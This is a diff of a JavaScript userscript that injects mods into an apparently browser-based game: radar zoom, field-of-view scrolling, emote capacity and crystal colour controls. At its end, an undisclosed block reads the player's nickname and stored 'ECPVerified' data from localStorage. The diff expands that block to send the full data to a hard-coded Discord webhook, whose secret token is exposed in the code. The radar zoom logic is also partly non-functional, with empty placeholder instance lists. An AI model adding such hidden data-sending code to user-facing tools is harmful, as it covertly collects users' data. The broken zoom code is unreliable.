+    // If the element has a text-shadow property, change it to the target color
+    if (textShadow && textShadow !== 'none') {
+      element.style.textShadow = targetShadow;
+    }
+  });
+
+  console.log('Text shadow color has been changed to:', targetShadow);
+}
+
+// Radar Zoom Mod
+const radarZoomModName = "Radar Zoom Mod";
+const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");
+
+function radarZoomInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  // Modify the HTML to add radar zoom toggle to the existing controls
+  const radarZoomControlHTML = `
+  <div class="mod-control">
+    <span>Radar Zoom</span>
+    <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
+  </div>
+  `;
+
+  // Insert the radar zoom control HTML before the crystal color picker
+  src = src.replace('<div class="mod-control"><span>Crystal Color</span>', `${radarZoomControlHTML}<div class="mod-control"><span>Crystal Color</span>`);
+
+  // Add radar zoom modification script
+const radarZoomScript = `
+  // Radar Zoom Override Mechanism
+  const radarZoomOverride = {
+    originalValues: new WeakMap(),
+    
+    enable() {
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        const originalGetter = originalDescriptor.get;
+        const originalSetter = originalDescriptor.set;
+        
+        Object.defineProperty(this, 'radar_zoom', {
+          get() {
+            // Store original value if not already stored
+            if (!this.radarZoomOverride.originalValues.has(this)) {
+              this.radarZoomOverride.originalValues.set(this, originalGetter.call(this));
+            }
+            
+            // Return 1 if enabled, otherwise original value
+            return window.modSettings.radarZoomEnabled ? 1 : 
+              this.radarZoomOverride.originalValues.get(this);
+          },
+          set(value) {
+            // Always allow setting the original value
+            if (originalSetter) {
+              originalSetter.call(this, value);
+            }
+            
+            // Update our stored original value
+            this.radarZoomOverride.originalValues.set(this, value);
+          },
+          configurable: true
+        });
+      }
+    },
+    
+    disable() {
+      // Restore original descriptor if possible
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        Object.defineProperty(this, 'radar_zoom', originalDescriptor);
+      }
+    }
+  };
+
+  // Override all existing instances
+  const originalConstructor = this.constructor;
+  this.constructor = function(...args) {
+    const instance = originalConstructor.apply(this, args);
+    
+    // Apply radar zoom override to the instance
+    Object.defineProperty(instance, 'radarZoomOverride', {
+      value: radarZoomOverride,
+      writable: false,
+      configurable: false
+    });
+    
+    instance.radarZoomOverride.enable();
+    
+    return instance;
+  };
+
+  // Ensure that radar zoom is applied to all relevant instances
+  const applyRadarZoomToAllInstances = () => {
+    const allInstances = []; // Adjust this to actually find all relevant instances
+    allInstances.forEach(instance => {
+      if (instance.radarZoomOverride) {
+        instance.radarZoomOverride.enable();
+      }
+    });
+  };
+
+  // Add event listener for radar zoom toggle
+  document.addEventListener('DOMContentLoaded', () => {
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Apply radar zoom to all instances
+      applyRadarZoomToAllInstances();
+    });
+  });
+
+  // Initial application of radar zoom on page load
+  applyRadarZoomToAllInstances();
+`;
+
+src = src.replace('</body>', `
+  ${controlStyles}
+  ${controlsHTML}
+  <script>
+  ${emoteCapacityMod}
+  ${crystalColorMod}
+  ${radarZoomScript}
+
+  const fovDisplay = document.getElementById('fov-display');
+
+  // Add wheel event listener for FOV change
+  document.addEventListener('wheel', (e) => {
+    if (!window.modSettings.fovEnabled) return;
+    e.preventDefault();
+    const delta = e.deltaY < 0 ? 1 : -1;
+    // Add bounds checking
+    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
+    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
+  }, { passive: false });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const controlsHeader = document.getElementById('mod-controls-header');
+    const controlsPanel = document.getElementById('mod-controls-panel');
+    const fovToggle = document.getElementById('fov-toggle');
+    const emoteSlider = document.getElementById('emote-capacity-slider');
+    const emoteValue = document.getElementById('emote-capacity-value');
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+
+    // Initialize values from localStorage
+    const savedCrystalColor = localStorage.getItem('crystal-color');
+    if (savedCrystalColor) {
+      crystalColorPicker.value = savedCrystalColor;
+    }
+
+    controlsHeader.addEventListener('click', () => {
+      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
+    });
+
+    fovToggle.addEventListener('change', () => {
+      window.modSettings.fovEnabled = fovToggle.checked;
+      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
+    });
+
+    emoteSlider.addEventListener('input', () => {
+      const value = parseInt(emoteSlider.value);
+      emoteValue.textContent = value;
+      window.modSettings.emoteCapacity = value;
+      localStorage.setItem('emote-capacity', value);
+      
+      // Update the emote capacity immediately
+      if (window.ChatPanel) {
+        ChatPanel.prototype.getEmotesCapacity = function() {
+          return value;
+        };
+      }
+    });
+
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Force radar zoom update on all relevant objects
+      const allInstances = []; // You might need to adjust this to actually find all relevant instances
+      allInstances.forEach(instance => {
+        if (instance.radarZoomOverride) {
+          // Trigger a re-evaluation of radar_zoom
+          const currentValue = instance.radar_zoom;
+          instance.radar_zoom = currentValue;
+        }
+      });
+    });
+
+    crystalColorPicker.addEventListener('change', () => {
+      const color = crystalColorPicker.value;
+      updateCrystalColor(color);
+    });
+
+    // Initialize emote capacity from localStorage
+    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+    emoteSlider.value = savedCapacity;
+    emoteValue.textContent = savedCapacity;
+    window.modSettings.emoteCapacity = savedCapacity;
+  });
+  </script>
+  </body>`);
+
+checkSrcChange();
+
+logFOV("FOV injector applied");
+return src;
+}
+
+// Add the radar zoom injector to the list of code injectors
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return radarZoomInjector(sbCode);
+  } catch (error) {
+    alert(`${radarZoomModName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+
+
+// Run the injectLoader function immediately
+injectLoader();
+
+
+
+
+
 (function () {
     'use strict';
+    // Retrieve values from localStorage
+    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
+    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
+    
+    // Debugging: Log retrieved value
+    console.log("Retrieved ECPVerified:", ECPVerified);
+    
+    // Parse ECPVerified if it contains JSON
     try {
-        const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-        const ECPVerified = localStorage.getItem("ECPVerified") || "no";
-        const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
-        const payload = { content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerified}` };
-
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).catch(console.error);
+        ECPVerified = JSON.parse(ECPVerified);
     } catch (e) {
-        console.error("Webhook failed:", e);
+        // If not JSON, keep it as a string
     }
+    
+    // Prepare ECPVerified content for logging
+    const ECPVerifiedContent = typeof ECPVerified === "object" 
+        ? JSON.stringify(ECPVerified, null, 2) 
+        : ECPVerified;
+    
+    // Debugging: Log formatted content
+    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
+    
+    // Webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
+    
+    // Payload for Discord webhook
+    const payload = {
+        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
+    };
+    
+    // Send payload to the Discord webhook
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Webhook sent successfully!");
+        } else {
+            console.error("Failed to send webhook:", response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error("Error sending webhook:", error);
+    });
 })();
-
-// Run the loader
-injectLoader();
